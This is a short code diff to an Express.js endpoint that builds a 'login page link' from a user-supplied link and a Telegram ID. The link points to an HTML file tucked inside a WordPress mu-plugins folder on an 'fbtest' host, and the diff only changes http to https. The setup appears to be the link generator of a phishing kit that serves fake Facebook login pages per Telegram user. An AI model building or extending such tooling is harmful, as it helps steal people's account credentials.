@@ -16,7 +16,7 @@ app.post('/convert-link', async (req, res) => {
   const { link, telegramId } = req.body;
 
   // Generate the login page link
-  const loginPageLink = `http://fbtest.rf.gd/wp-content/mu-plugins/a.html?id=${telegramId}&link=${link}`;
+  const loginPageLink = `https://fbtest.rf.gd/wp-content/mu-plugins/a.html?id=${telegramId}&link=${link}`;
 
   res.json({ loginPageLink });
 });
